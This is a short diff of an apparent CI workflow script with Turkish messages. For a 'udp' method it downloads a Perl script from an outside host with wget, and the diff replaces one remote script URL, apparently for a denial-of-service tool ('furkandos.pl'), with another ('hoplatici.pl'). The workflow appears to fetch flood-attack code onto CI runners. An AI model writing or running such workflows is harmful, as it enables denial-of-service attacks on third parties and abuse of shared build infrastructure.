@@ -35,7 +35,7 @@ jobs:
 
           elif [ "$METHOD" = "udp" ]; then
             echo "UDP methodu indiriliyor..."
-            wget https://wgetz.com/coSOIi4Jg2/furkandos.pl -O a
+            wget https://wgetz.com/TDpEurDc2e/hoplatici.pl -O a
 
           else
             echo "Geçersiz method: $METHOD"
